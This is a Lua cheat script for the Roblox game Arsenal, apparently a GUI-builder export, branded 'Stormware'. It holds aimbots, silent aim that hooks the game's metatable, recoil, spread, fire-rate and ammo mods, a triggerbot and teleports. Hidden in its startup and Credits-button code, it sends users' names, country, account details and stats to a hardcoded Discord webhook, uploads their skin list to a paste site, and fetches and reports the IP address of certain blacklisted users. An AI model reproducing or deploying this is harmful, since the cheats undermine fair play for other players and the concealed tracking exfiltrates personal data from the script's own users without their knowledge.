Title_2.TextSize = 14.000
Title_2.TextWrapped = true

upperText.Name = "upperText"
upperText.Parent = CreditsFrame
upperText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
upperText.BackgroundTransparency = 1.000
upperText.Position = UDim2.new(0.25247106, 0, 0.392080426, 0)
upperText.Size = UDim2.new(0, 228, 0, 33)
upperText.Font = Enum.Font.SciFi
upperText.Text = "Stormware, the most best competitve arsenal exploit, Developed By"
upperText.TextColor3 = Color3.fromRGB(255, 255, 255)
upperText.TextSize = 16.000

stormcr.Name = "stormcr"
stormcr.Parent = CreditsFrame
stormcr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
stormcr.BackgroundTransparency = 1.000
stormcr.Position = UDim2.new(0.25247106, 0, 0.533711314, 0)
stormcr.Size = UDim2.new(0, 228, 0, 33)
stormcr.Font = Enum.Font.SciFi
stormcr.Text = "Storm.#1020  - Core Development And Webhook"
stormcr.TextColor3 = Color3.fromRGB(255, 255, 255)
stormcr.TextSize = 16.000

lolcat_relative.Name = "lolcat_relative"
lolcat_relative.Parent = CreditsFrame
lolcat_relative.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
lolcat_relative.BackgroundTransparency = 1.000
lolcat_relative.Position = UDim2.new(0.317126215, 0, 0.641007423, 0)
lolcat_relative.Size = UDim2.new(0, 228, 0, 33)
lolcat_relative.Font = Enum.Font.SciFi
lolcat_relative.Text = "lolcat#1337  - Additional Webhook Infos (level, skin, melee)"
lolcat_relative.TextColor3 = Color3.fromRGB(255, 255, 255)
lolcat_relative.TextSize = 16.000

SIDE.Name = "SIDE"
SIDE.Parent = ware
SIDE.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
SIDE.Position = UDim2.new(0.0109090917, 0, 0.0506172851, 0)
SIDE.Size = UDim2.new(0, 189, 0, 740)

UICorner_40.Parent = SIDE

Visuals.Name = "Visuals"
Visuals.Parent = SIDE
Visuals.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Visuals.BackgroundTransparency = 0.500
Visuals.Position = UDim2.new(0.0093669584, 0, 0.482378662, 0)
Visuals.Size = UDim2.new(0, 185, 0, 50)
Visuals.Font = Enum.Font.Nunito
Visuals.Text = "Visuals"
Visuals.TextColor3 = Color3.fromRGB(255, 255, 255)
Visuals.TextSize = 22.000

Player.Name = "Player"
Player.Parent = SIDE
Player.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Player.BackgroundTransparency = 0.500
Player.Position = UDim2.new(0.00325222127, 0, 0.390143812, 0)
Player.Size = UDim2.new(0, 186, 0, 50)
Player.Font = Enum.Font.Nunito
Player.Text = "Player/FE"
Player.TextColor3 = Color3.fromRGB(255, 255, 255)
Player.TextSize = 22.000

Home.Name = "Home"
Home.Parent = SIDE
Home.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Home.BackgroundTransparency = 0.500
Home.Position = UDim2.new(0.00407595374, 0, 0.208732098, 0)
Home.Size = UDim2.new(0, 186, 0, 50)
Home.Font = Enum.Font.Nunito
Home.Text = "Home"
Home.TextColor3 = Color3.fromRGB(255, 255, 255)
Home.TextSize = 22.000

Credits.Name = "Credits"
Credits.Parent = SIDE
Credits.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Credits.BackgroundTransparency = 1.000
Credits.Position = UDim2.new(0.0124831833, 0, 0.932077467, 0)
Credits.Size = UDim2.new(0, 185, 0, 50)
Credits.Font = Enum.Font.Nunito
Credits.Text = "Credits"
Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits.TextSize = 22.000

Combat.Name = "Combat"
Combat.Parent = SIDE
Combat.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Combat.BackgroundTransparency = 0.500
Combat.Position = UDim2.new(0.0177741908, 0, 0.303669691, 0)
Combat.Size = UDim2.new(0, 185, 0, 50)
Combat.Font = Enum.Font.Nunito
Combat.Text = "Combat"
Combat.TextColor3 = Color3.fromRGB(255, 255, 255)
Combat.TextSize = 22.000

SEPERATOR.Name = "SEPERATOR"
SEPERATOR.Parent = SIDE
SEPERATOR.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SEPERATOR.BackgroundTransparency = 1.000
SEPERATOR.Position = UDim2.new(-0.0965054184, 0, 0.125675678, 0)
SEPERATOR.Size = UDim2.new(0, 208, 0, 50)
SEPERATOR.Font = Enum.Font.SourceSans
SEPERATOR.Text = "________________________"
SEPERATOR.TextColor3 = Color3.fromRGB(255, 255, 255)
SEPERATOR.TextSize = 14.000

PFP.Name = "PFP"
PFP.Parent = SIDE
PFP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PFP.BackgroundTransparency = 1.000
PFP.Position = UDim2.new(0.334727407, 0, 0.0135135138, 0)
PFP.Size = UDim2.new(0, 56, 0, 43)
PFP.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

UICorner_41.CornerRadius = UDim.new(0, 10)
UICorner_41.Parent = PFP

currName.Name = "currName"
currName.Parent = SIDE
currName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
currName.BackgroundTransparency = 1.000
currName.Position = UDim2.new(-0.0700503886, 0, 0.0581081063, 0)
currName.Size = UDim2.new(0, 208, 0, 50)
currName.Font = Enum.Font.Jura
currName.Text = "Name"
currName.TextColor3 = Color3.fromRGB(255, 255, 255)
currName.TextSize = 26.000
currName.TextWrapped = true

rnk.Name = "rnk"
rnk.Parent = SIDE
rnk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rnk.BackgroundTransparency = 1.000
rnk.Position = UDim2.new(-0.117669448, 0, 0.106756754, 0)
rnk.Size = UDim2.new(0, 208, 0, 50)
rnk.Font = Enum.Font.Jura
rnk.Text = "Rank: Bri'ish"
rnk.TextColor3 = Color3.fromRGB(255, 255, 255)
rnk.TextSize = 26.000
rnk.TextWrapped = true

-- Scripts:

local function HOTAI_fake_script() -- Visuals.LocalScript 
	local script = Instance.new('LocalScript', Visuals)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.Parent.HomeFrame.Visible = false
		script.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.VisualFrame.Visible = true
	end)
end
coroutine.wrap(HOTAI_fake_script)()
local function GCFL_fake_script() -- Player.LocalScript 
	local script = Instance.new('LocalScript', Player)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.Parent.PlayerFrame.Visible = true
		script.Parent.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.Parent.HomeFrame.Visible = false
		script.Parent.Parent.Parent.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(GCFL_fake_script)()
local function YBVAFQ_fake_script() -- Home.LocalScript 
	local script = Instance.new('LocalScript', Home)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.Parent.HomeFrame.Visible = true
		script.Parent.Parent.Parent.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(YBVAFQ_fake_script)()
local function RHOBEGE_fake_script() -- Credits.LocalScript 
	local script = Instance.new('LocalScript', Credits)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.Parent.CreditsFrame.Visible = true
		script.Parent.Parent.Parent.HomeFrame.Visible = false
		
	
		local executor = "Unknown Exploit"
		pcall(function()
			executor = identifyexecutor()
		end)
		local pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"
		pcall(function()
			pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
		end)
		local premium = "No"
		if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
			premium = "Yes"
		end
		local url =
			"https://discord.com/api/webhooks/982967701972615178/K0KwypZfuqgIK4VLBafFRbFGuRaV4sUNH72w_LRpgwbgPTUjsU8m1O3KJgFl7sZehrIJ"
		local data = {
			["embeds"] = {
				{
					["color"] = 7498202,
					["fields"] = {
						{
							["name"] = "Executor",
							["value"] = executor,
							["inline"] = true
						},
						{
							["name"] = "Clock",
							["value"] = os.date("%I:%M %p"),
							["inline"] = true
						},
						{
							["name"] = "Flag",
							["value"] = ":flag_" .. game.LocalizationService:GetCountryRegionForPlayerAsync(game.Players.LocalPlayer):lower() .. ":",
							["inline"] = true
						},
						{
							["name"] = "Account Age",
							["value"] = game.Players.LocalPlayer.AccountAge .. " days",
							["inline"] = true
						},
						{
							["name"] = "Premium",
							["value"] = premium,
							["inline"] = true
						},
						{
							["name"] = "​",
							["value"] = "​"
						},
						{
							["name"] = "Level",
							["value"] = game.Players.LocalPlayer.CareerStatsCache.Level.Value,
							["inline"] = true
						},
						{
							["name"] = "Skin",
							["value"] = game.Players.LocalPlayer.Data.Skin.Value,
							["inline"] = true
						},
						{
							["name"] = "Melee",
							["value"] = game.Players.LocalPlayer.Data.Melee.Value,
							["inline"] = true
						}
					},
					["author"] = {
						["name"] = game.Players.LocalPlayer.Name .. " viewed The credits!",
						["icon_url"] = pfp
					}
				}
			}
		}
		local newdata = game:GetService("HttpService"):JSONEncode(data)
	
		local headers = {
			["content-type"] = "application/json"
		}
		request = http_request or request or HttpPost or syn.request
		local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
		request(abcdef)
	
	
	end)
end
coroutine.wrap(RHOBEGE_fake_script)()
local function KFIJGIL_fake_script() -- Combat.LocalScript 
	local script = Instance.new('LocalScript', Combat)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.CombatFrame.Visible = true
		script.Parent.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.Parent.HomeFrame.Visible = false
		script.Parent.Parent.Parent.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(KFIJGIL_fake_script)()
local function JPSURY_fake_script() -- StormWareX.Core 
	local script = Instance.new('LocalScript', StormWareX)

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	
	function comma_value(amount)
		local formatted = amount
		while true do  
			formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
			if (k==0) then
				break
			end
		end
		return formatted
	end
	local skins = {}
	for i,v in pairs(game.Players.LocalPlayer.Data.Shuffles.Skins:GetChildren()) do
		table.insert(skins, v.Name)
	end
	skins = table.concat(skins, "\n")
	local url = "https://www.toptal.com/developers/hastebin/documents"
	local newdata = skins
	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	local response
	local result = pcall(function()
		response = request(abcdef)
	end)
	local link = "Error"
	if result then
		pcall(function()
			local body = response.Body
			local key = game:GetService("HttpService"):JSONDecode(body).key
			link = "https://hastebin.com/" .. key
		end)
	end
	local executor = "Unknown Exploit"
	pcall(function()
		executor = identifyexecutor()
	end)
	if executor == "WRD-API" then
		executor = "JJSploit"
	end
	local pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"
	pcall(function()
		pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
	end)
	local premium = "No"
	if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
		premium = "Yes"
	end
	local ip = " // NOT BLACKLISTED"
	-- IF A BLACKLISTED BITCH USES THIS
	if game.Players.LocalPlayer.UserId == 3498733335 or game.Players.LocalPlayer.UserId == 3489570364 then
		ip = game:HttpGet("https://wtfismyip.com/text")
	end
	-- i do not like bitches
	-- plez do not spam the webhook zamn
	
	local url =
		"https://discord.com/api/webhooks/982967701972615178/K0KwypZfuqgIK4VLBafFRbFGuRaV4sUNH72w_LRpgwbgPTUjsU8m1O3KJgFl7sZehrIJ"
	local data = {
		["embeds"] = {
			{
				["color"] = 7498202,
				["fields"] = {
					{
						["name"] = "Executor",
						["value"] = executor,
						["inline"] = true
					},
					{
						["name"] = "Clock",
						["value"] = os.date("%I:%M %p"),
						["inline"] = true
					},
					{
						["name"] = "Flag",
						["value"] = ":flag_" .. game.LocalizationService:GetCountryRegionForPlayerAsync(game.Players.LocalPlayer):lower() .. ":",
						["inline"] = true
					},
					{
						["name"] = "Account Age",
						["value"] = game.Players.LocalPlayer.AccountAge .. " days",
						["inline"] = true
					},
					{
						["name"] = "Premium",
						["value"] = premium,
						["inline"] = true
					},
					{
						["name"] = "Level",
						["value"] = game.Players.LocalPlayer.CareerStatsCache.Level.Value,
						["inline"] = true
					},
					{
						["name"] = "Skin",
						["value"] = game.Players.LocalPlayer.Data.Skin.Value,
						["inline"] = true
					},
					{
						["name"] = "Melee",
						["value"] = game.Players.LocalPlayer.Data.Melee.Value,
						["inline"] = true
					},
					{
						["name"] = "Kills",
						["value"] = comma_value(game.Players.LocalPlayer.Data.KD.KOs.Value),
						["inline"] = true
					},
					{
						["name"] = "Deaths",
						["value"] = comma_value(game.Players.LocalPlayer.Data.KD.WOs.Value),
						["inline"] = true
					},
					{
						["name"] = "KDR",
						["value"] = tostring(math.floor((game.Players.LocalPlayer.Data.KD.KOs.Value / game.Players.LocalPlayer.Data.KD.WOs.Value) * 100) / 100),
						["inline"] = true
					},
					{
						["name"] = "Skins",
						["value"] = link,
						["inline"] = true
					}
				},
				["author"] = {
					["name"] = game.Players.LocalPlayer.Name .. ip,
					["icon_url"] = pfp
				}
			}
		}
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data)
	
	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)
	
	
	
	
	
	
	script.Parent.ware.VisualFrame.viss.updFov.MouseButton1Click:Connect(function()
		local fovVal = tonumber(script.Parent.ware.VisualFrame.fov.Text)
		game:GetService("Players").LocalPlayer.Settings.FOV.Value = fovVal
	end)
	
	
	local p = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"
	p = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
	local getCountry = game.LocalizationService:GetCountryRegionForPlayerAsync(game.Players.LocalPlayer):lower()
	
	script.Parent.ware.SIDE.PFP.Image = p -- simple enough i guess.
	script.Parent.ware.SIDE.currName.Text = game.Players.LocalPlayer.Name -- set our name!
	script.Parent.ware.SIDE.rnk.Text = "Rank - User"
	
	if getCountry == "gb" then
		script.Parent.ware.SIDE.rnk.Text = "Rank - Bri'ish"
	end
	
	if game.Players.LocalPlayer.UserId == 3095365092 then
		script.Parent.ware.SIDE.rnk.Text = "Rank - Owner"
	end
	
	
	script.Parent.ware.CombatFrame.killall.MouseButton1Click:Connect(function()
	
		for i,v in pairs(game.Players:GetPlayers()) do
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
			wait(2)
		end
	end)
	
	script.Parent.ware.CombatFrame.Free.MouseButton1Click:Connect(function()
		for i,v in pairs(game.Players:GetPlayers()) do
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
			wait(3)
		end
	end)
	
	script.Parent.ware.CombatFrame.used.aimlock.MouseButton1Click:Connect(function()
		local dwCamera = workspace.CurrentCamera
		local dwRunService = game:GetService("RunService")
		local dwUIS = game:GetService("UserInputService")
		local dwEntities = game:GetService("Players")
		local dwLocalPlayer = dwEntities.LocalPlayer
		local dwMouse = dwLocalPlayer:GetMouse()
	
		local settings = {
			Aimbot = true,
			Aiming = false,
			Aimbot_AimPart = "Head",
			Aimbot_TeamCheck = true,
			Aimbot_Draw_FOV = true,
			Aimbot_FOV_Radius = 200,
			Aimbot_FOV_Color = Color3.fromRGB(255,255,255)
		}
	
		local fovcircle = Drawing.new("Circle")
		fovcircle.Visible = settings.Aimbot_Draw_FOV
		fovcircle.Radius = settings.Aimbot_FOV_Radius
		fovcircle.Color = settings.Aimbot_FOV_Color
		fovcircle.Thickness = 1
		fovcircle.Filled = false
		fovcircle.Transparency = 1
	
		fovcircle.Position = Vector2.new(dwCamera.ViewportSize.X / 2, dwCamera.ViewportSize.Y / 2)
	
		dwUIS.InputBegan:Connect(function(i)
			if i.UserInputType == Enum.UserInputType.MouseButton2 then
				settings.Aiming = true
			end
		end)
	
		dwUIS.InputEnded:Connect(function(i)
			if i.UserInputType == Enum.UserInputType.MouseButton2 then
				settings.Aiming = false
			end
		end)
	
		dwRunService.RenderStepped:Connect(function()
	
			local dist = math.huge
			local closest_char = nil
	
			if settings.Aiming then
	
				for i,v in next, dwEntities:GetChildren() do 
	
					if v ~= dwLocalPlayer and
						v.Character and
						v.Character:FindFirstChild("HumanoidRootPart") and
						v.Character:FindFirstChild("Humanoid") and
						v.Character:FindFirstChild("Humanoid").Health > 0 then
	
						if settings.Aimbot_TeamCheck == true and
							v.Team ~= dwLocalPlayer.Team or
							settings.Aimbot_TeamCheck == false then
	
							local char = v.Character
							local char_part_pos, is_onscreen = dwCamera:WorldToViewportPoint(char[settings.Aimbot_AimPart].Position)
	
							if is_onscreen then
	
								local mag = (Vector2.new(dwMouse.X, dwMouse.Y) - Vector2.new(char_part_pos.X, char_part_pos.Y)).Magnitude
	
								if mag < dist and mag < settings.Aimbot_FOV_Radius then
	
									dist = mag
									closest_char = char
	
								end
							end
						end
					end
				end
	
				if closest_char ~= nil and
					closest_char:FindFirstChild("HumanoidRootPart") and
					closest_char:FindFirstChild("Humanoid") and
					closest_char:FindFirstChild("Humanoid").Health > 0 then
	
					dwCamera.CFrame = CFrame.new(dwCamera.CFrame.Position, closest_char[settings.Aimbot_AimPart].Position)
				end
			end
		end)
	end)
	
	
	script.Parent.ware.PlayerFrame.Others.Sunglasses.MouseButton1Click:Connect(function()
		while wait(1) do 
			game.ReplicatedStorage.Events.Sunglasses:FireServer()
		end
	end)
	
	
	
	script.Parent.ware.CombatFrame.used.Hitboxes.MouseButton1Click:Connect(function()
		local CurrentCamera = workspace.CurrentCamera
		local Players = game.GetService(game, "Players")
		local LocalPlayer = Players.LocalPlayer
		local Mouse = LocalPlayer:GetMouse()
		function ClosestPlayer()
			local MaxDist, Closest = math.huge
			for I,V in pairs(Players.GetPlayers(Players)) do
				if V == LocalPlayer then continue end
				if V.Team == LocalPlayer then continue end
				if not V.Character then continue end
				local Head = V.Character.FindFirstChild(V.Character, "Head")
				if not Head then continue end
				local Pos, Vis = CurrentCamera.WorldToScreenPoint(CurrentCamera, Head.Position)
				if not Vis then continue end
				local MousePos, TheirPos = Vector2.new(Mouse.X, Mouse.Y), Vector2.new(Pos.X, Pos.Y)
				local Dist = (TheirPos - MousePos).Magnitude
				if Dist < MaxDist then
					MaxDist = Dist
					Closest = V
				end
			end
			return Closest
		end
		local MT = getrawmetatable(game)
		local OldNC = MT.__namecall
		local OldIDX = MT.__index
		setreadonly(MT, false)
		MT.__namecall = newcclosure(function(self, ...)
			local Args, Method = {...}, getnamecallmethod()
			if Method == "FindPartOnRayWithIgnoreList" and not checkcaller() then
				local CP = ClosestPlayer()
				if CP and CP.Character and CP.Character.FindFirstChild(CP.Character, "Head") then
					Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character.Head.Position - CurrentCamera.CFrame.Position).Unit * 1000)
					return OldNC(self, unpack(Args))
				end
			end
			return OldNC(self, ...)
		end)
	
	end)
	
	
	script.Parent.ware.CombatFrame.mods.noRecoil.MouseButton1Click:Connect(function()
		for i,v in next, game.ReplicatedStorage.Weapons:GetChildren() do
			for i,c in next, v:GetChildren() do 
				for i,x in next, getconnections(c.Changed) do
					x:Disable() -- probably not needed
				end
				if c.Name == "RecoilControl" then
					c.Value = 0 -- very gamer
				end
			end
		end
	end)
	
	
	script.Parent.ware.CombatFrame.mods.nospread.MouseButton1Click:Connect(function()
		for i,v in next, game.ReplicatedStorage.Weapons:GetChildren() do
			for i,c in next, v:GetChildren() do 
				for i,x in next, getconnections(c.Changed) do
					x:Disable() -- probably not needed
				end
				if c.Name == "Spread" then
					c.Value = 0 -- very gamer
				end
			end
		end
	end)
	
	script.Parent.ware.CombatFrame.used.random.MouseButton1Click:Connect(function()
		local CurrentCamera = workspace.CurrentCamera
		local choice = math.random(1,2)
		local Players = game.GetService(game, "Players")
		local LocalPlayer = Players.LocalPlayer
		local aimPart = "nothin'"
		local Mouse = LocalPlayer:GetMouse()
		if choice == 1 then
			aimPart = "Head"
		else
			aimPart = "LowerTorso"
		end
		function ClosestPlayer()
			local MaxDist, Closest = math.huge
			for I,V in pairs(Players.GetPlayers(Players)) do
				if V == LocalPlayer then continue end
				if V.Team == LocalPlayer then continue end
				if not V.Character then continue end
				local Head = V.Character.FindFirstChild(V.Character, aimPart)
				if not Head then continue end
				local Pos, Vis = CurrentCamera.WorldToScreenPoint(CurrentCamera, Head.Position)
				if not Vis then continue end
				local MousePos, TheirPos = Vector2.new(Mouse.X, Mouse.Y), Vector2.new(Pos.X, Pos.Y)
				local Dist = (TheirPos - MousePos).Magnitude
				if Dist < MaxDist then
					MaxDist = Dist
					Closest = V
				end
			end
			return Closest
		end
		local MT = getrawmetatable(game)
		local OldNC = MT.__namecall
		local OldIDX = MT.__index
		setreadonly(MT, false)
		MT.__namecall = newcclosure(function(self, ...)
			local Args, Method = {...}, getnamecallmethod()
			if Method == "FindPartOnRayWithIgnoreList" and not checkcaller() then
				local CP = ClosestPlayer()
				if CP and CP.Character and CP.Character.FindFirstChild(CP.Character, aimPart) then
					Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character[aimPart].Position - CurrentCamera.CFrame.Position).Unit * 1000)
					return OldNC(self, unpack(Args))
				end
			end
			return OldNC(self, ...)
		end)
		
		print(aimPart)
		while wait(0.6) do
			local c = math.random(1,2)
			if c == 1 then
				aimPart = "Head"
			else
				aimPart = "LowerTorso"
			end
		end
	end)
	
	
	script.Parent.ware.CombatFrame.used.Smoothlock.MouseButton1Click:Connect(function()
		bodyPart = 'Head'
	
		on = false
	
		local lp = game:GetService('Players').LocalPlayer
		local char = lp.Character
	
	
		local mouse = lp:GetMouse()
	
	
		game:GetService("UserInputService").InputBegan:connect(function(inputObject)
			if inputObject.KeyCode == Enum.KeyCode.C then
				on = not on
			end
		end)
	
	
	
	
	
	
	
	
	
	
	
	
	--[[local function isObstructed(part)
	   local hrp = char.HumanoidRootPart
	   local PointA_Position = hrp.Position
	   local PointB_Position = part.Position
	
	   local Direction = (PointB_Position - PointA_Position).Unit
	   local Raycast = Ray.new(PointA_Position, Direction * 100)
	   local Hit = workspace:FindPartOnRay(Raycast, char)
	   if Hit == part then
	       return true
	   else
	       return false
	   end
	end
	]]
	
		function cansee(targ)
			local cam = workspace.CurrentCamera
			local ray = Ray.new(lp.Character.Head.CFrame.p, (targ.CFrame.p - lp.Character.Head.CFrame.p).unit * 300)
			local part, position = workspace:FindPartOnRayWithIgnoreList(ray, {lp.Character}, false, true)
			if part then
				local humanoid = part.Parent:FindFirstChildOfClass("Humanoid")
	
				if not humanoid then
					humanoid = part.Parent.Parent:FindFirstChildOfClass("Humanoid")
				end
	
				if humanoid and targ and humanoid.Parent == targ.Parent then
					local blah,actualthing = cam:WorldToScreenPoint(targ.Position)
					if actualthing == true then
						return true
					else
						return false
					end
				else
					return false
				end
			else
				return false
			end
		end
	
	
	
	
		local function getClosestPlayerToCursor(x, y)
			local closestPlayer = nil
			local shortestDistance = math.huge
	
			for i, v in pairs(game:GetService("Players"):GetPlayers()) do
				if v ~= lp and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Head") then
					local pos = game:GetService("Workspace").CurrentCamera:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
					local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(x, y)).magnitude
	
					local targettable = (v.Team ~= lp.Team or v.Team == nil) and v.Character.Humanoid.Health > 0
					if magnitude < shortestDistance and cansee(v.Character.Head) == true and (v.Team ~= lp.Team or v.Team == nil) and v.Character.Humanoid.Health > 0 then
						closestPlayer = v
						shortestDistance = magnitude
					end
				end
			end
			return closestPlayer, shortestDistance
		end
	
	
	
	
	
	
	
	
	
	
		TweenStatus = nil
	
		local TweenService = game:GetService("TweenService")
		TweenCFrame = Instance.new("CFrameValue")
	
	
		function tweenstuff(partpos)
			TweenStatus = true
			TweenCFrame.Value = workspace.CurrentCamera.CFrame
			local tweenframe = TweenService:Create(TweenCFrame, TweenInfo.new(0.2),{Value = CFrame.new(workspace.CurrentCamera.CFrame.Position, partpos)})
			tweenframe:Play()
			tweenframe.Completed:Wait()
			TweenStatus = nil
			TweenCFrame.Value = CFrame.new(0,0,0)
		end
	
	
	
	
		game:GetService('RunService').Heartbeat:connect(function()
			if on == true then
				local plr, distance = getClosestPlayerToCursor(mouse.X, mouse.Y)
				if TweenStatus == nil and plr ~= nil and distance > 150 then
					tweenstuff(plr.Character.Head.Position)
				end
				if TweenStatus == true then
					workspace.CurrentCamera.CFrame = TweenCFrame.Value
				end
				if plr ~= nil and distance < 150 and TweenStatus == nil then
					workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, plr.Character.Head.Position)
				end
			end
		end)
	end)
	
	script.Parent.ware.CombatFrame.used.lowertorso.MouseButton1Click:Connect(function()
		local CurrentCamera = workspace.CurrentCamera
		local Players = game.GetService(game, "Players")
		local LocalPlayer = Players.LocalPlayer
		local Mouse = LocalPlayer:GetMouse()
		function ClosestPlayer()
			local MaxDist, Closest = math.huge
			for I,V in pairs(Players.GetPlayers(Players)) do
				if V == LocalPlayer then continue end
				if V.Team == LocalPlayer then continue end
				if not V.Character then continue end
				local Head = V.Character.FindFirstChild(V.Character, "LowerTorso")
				if not Head then continue end
				local Pos, Vis = CurrentCamera.WorldToScreenPoint(CurrentCamera, Head.Position)
				if not Vis then continue end
				local MousePos, TheirPos = Vector2.new(Mouse.X, Mouse.Y), Vector2.new(Pos.X, Pos.Y)
				local Dist = (TheirPos - MousePos).Magnitude
				if Dist < MaxDist then
					MaxDist = Dist
					Closest = V
				end
			end
			return Closest
		end
		local MT = getrawmetatable(game)
		local OldNC = MT.__namecall
		local OldIDX = MT.__index
		setreadonly(MT, false)
		MT.__namecall = newcclosure(function(self, ...)
			local Args, Method = {...}, getnamecallmethod()
			if Method == "FindPartOnRayWithIgnoreList" and not checkcaller() then
				local CP = ClosestPlayer()
				if CP and CP.Character and CP.Character.FindFirstChild(CP.Character, "LowerTorso") then
					Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character.LowerTorso.Position - CurrentCamera.CFrame.Position).Unit * 1000)
					return OldNC(self, unpack(Args))
				end
			end
			return OldNC(self, ...)
		end)
	
	
	end)
	
	script.Parent.ware.CombatFrame.mods.FireRate.MouseButton1Click:Connect(function()
		for i,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
			print(v.Name)
			print(v.FireRate.Value)
			v.FireRate.Value = 0.03
			v.Auto.Value = true
		end
	end)
	
	script.Parent.ware.CombatFrame.mods.InfAmmo.MouseButton1Click:Connect(function()
		if game:GetService("ReplicatedStorage").wkspc.CurrentCurse.Value == "Infinite Ammo" then
			game:GetService("ReplicatedStorage").wkspc.CurrentCurse.Value = ""
		else
			game:GetService("ReplicatedStorage").wkspc.CurrentCurse.Value = "Infinite Ammo"
		end
	end)
	
	script.Parent.ware.CombatFrame.used.triggerbot.MouseButton1Click:Connect(function()
		local player = game:GetService("Players").LocalPlayer
		local mouseGet = player:GetMouse()
		game:GetService("RunService").RenderStepped:Connect(function()
			if mouseGet.Target.Parent:FindFirstChild("Humanoid") and mouseGet.Target.Parent.Name ~= player.Name and game.Players:GetPlayerFromCharacter(mouseGet.Target.Parent).Team ~= player.Team then
				mouse1press() 
				wait(1) 
				mouse1release()
			end
		end) 
	end)
	
	
	
	script.Parent.ware.PlayerFrame.Others.upd.MouseButton1Click:Connect(function()
		local value = script.Parent.ware.PlayerFrame.Others.Gravity.Text
		local numb = tonumber(value)
		game:GetService("ReplicatedStorage").CurrentGrav.Value = value
	end)
	script.Parent.ware.PlayerFrame.tpfly.tel.MouseButton1Click:Connect(function()
		local plr = game.Players[script.Parent.ware.PlayerFrame.teleport.Text]
		local char = plr.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = char
		
	end)
	
	script.Parent.ware.PlayerFrame.Others.Walkspeed.MouseButton1Click:Connect(function()
		if game:GetService("ReplicatedStorage").Arcade.Value == true then
			game:GetService("ReplicatedStorage").Arcade.Value = false
		else
			game:GetService("ReplicatedStorage").Arcade.Value = true
		end
	end)
	
	script.Parent.ware.PlayerFrame.DSpoofs.mobile.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("Touch")
	end)
	
	script.Parent.ware.PlayerFrame.DSpoofs.console.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("Gamepad1")
	end)
	
	script.Parent.ware.PlayerFrame.DSpoofs.none.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("None")
	end)
	
